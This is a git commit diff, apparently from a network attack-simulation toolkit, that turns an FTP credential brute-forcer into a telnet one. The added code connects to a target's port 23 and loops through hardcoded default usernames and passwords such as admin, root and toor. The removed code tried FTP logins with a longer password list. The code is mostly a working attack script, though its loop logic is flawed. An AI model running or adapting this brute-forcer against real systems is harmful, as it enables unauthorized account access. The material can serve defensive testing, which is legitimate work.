e2401d90bc020b250e232d3151cfc07dd918a36c
TryCatchHCF <TryCatchHCF@users.noreply.github.com>
2017-10-13 23:48:38 -0700

    Add files via upload

--- FireModules/AccountBruting/telnet_top_100_defaults.py
+++ FireModules/AccountBruting/telnet_top_100_defaults.py
@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #
-# Filename:  ftp_linux_top_100_defaults.py.py
+# Filename:  telnet_top_100_defaults.py
 #
 # Version: 1.0.0
 #
@@ -12,34 +12,34 @@
 #
 #
 
-import os, sys, datetime, ftplib
+import os, sys, telnetlib, datetime
 
 
 from FireModules.fire_module_base_class import *
 
-class ftp_linux_top_100_defaults( FireModule ):
+class telnet_top_100_defaults( FireModule ):
 
 	def __init__(self):
-		self.commentsStr = "AccountBruting/ftp_linux_top_100_defaults"
+		self.commentsStr = "AccountBruting/telnet_top_100_defaults"
 
 	def __init__(self, moofStr):
 		self.moofStr = moofStr
-		self.commentsStr = "AccountBruting/ftp_linux_top_100_defaults"
+		self.commentsStr = "AccountBruting/telnet_top_100_defaults"
 		return;
 
 	def Description( self ):
-		self.Description = "Launches ftp login bruteforce against target system, using common users/passwords"
+		self.Description = "Launches telnet bruteforce against target system, using common users/passwords"
 		return self.Description
 
         def Configure( self ):
-                self.targetSystem = raw_input( "Enter target address (W.X.Y.Z) or domain: " )
+                self.networkAddrStr = raw_input( "Enter target address (W.X.Y.Z) or domain: " )
                 return
 
         def GetParameters( self ):
-                return( self.targetSystem )
+                return( self.networkAddrStr )
 
         def SetParameters( self, parametersStr ):
-                self.targetSystem = parametersStr
+                self.networkAddrStr = parametersStr
                 return
 
         def ActivateLogging( self, logFlag ):
@@ -49,59 +49,50 @@ class ftp_linux_top_100_defaults( FireModule ):
 
         def Ignite( self ):
 
-		if ( self.targetSystem == "" ):
+		if ( self.networkAddrStr == "" ):
 			print "## ", self.commentsStr, ": Error - Network address string is blank"
 			return
 		else:
 
 			self.mCurrentDateTimeUTC = datetime.datetime.utcnow()
 
-			print "UTC", self.mCurrentDateTimeUTC.strftime("%x %X"), "- Attempting ftp connection to:", self.targetSystem
+			print "UTC", self.mCurrentDateTimeUTC.strftime("%x %X"), "- Attempting telnet connection to:", self.networkAddrStr
+
 			try:
-				print "Attempting to ftp into host", self.targetSystem
+				# Set timeout to 3 seconds so we don't stall out
+				telnetSession = telnetlib.Telnet( self.networkAddrStr, 23, 3 )
+	
+				print "Telnet session established to host:", self.networkAddrStr
 
 				i = 0
 				m = 0
-	
-				while i < len( ftpUsernames ):
-					while m < len( ftpPasswords ):
 
-						if ftpSession.login( self.targetSystem, ftpUsernames[ i ], ftpPasswords[ m ] ):
-							self.commandStr = "ftp " + ftpUsernames[ i ] + "@" + self.targetSystem
-							os.system( self.commandStr )
+				# If we got a telnet session, time to bruteforce some creds
+
+				while i < len( telnetUsernames ):
+					while m < len( telnetPasswords ):
+
+						telnetSession.read_until( "login: " )
+						telnetSession.write( telnetUsernames[ i ] + "\n" )
+			
+						telnetSession.read_until( "Password: " )
+						telnetSession.write( telnetPasswords[ m ] + "\n" )
+	
 						m = m + 1
 					i = i + 1
-
 			except:
-				print "Could not establish ftp connection"
+				print "Could not establish telnet connection"
 
 		return
 
-    
 	# Declare these lists down here so they don't clutter up the methods
-	ftpUsernames = [ "admin", "root", "test", "ftp" ]
-	ftpPasswords = [ "", \
-			"admin", \
+	telnetUsernames = [ "admin", "root", "test", "telnet" ]
+	telnetPasswords = [ "admin", \
 			"administrator", \
 			"root", \
 			"test", \
-			"ftp", \
+			"telnet", \
 			"toor", \
-			"dev", \
-			"uploader", \
-			"password", \
-			"administrator", \
-			"marketing", \
-			"12345678", \
-			"1234", \
-			"12345", \
-			"qwerty", \
-			"webadmin", \
-			"webmaster", \
-			"maintenance", \
-			"techsupport", \
-			"letmein", \
-			"logon", \
 			"password", \
 			"password1", \
 			"Passw@rd", \
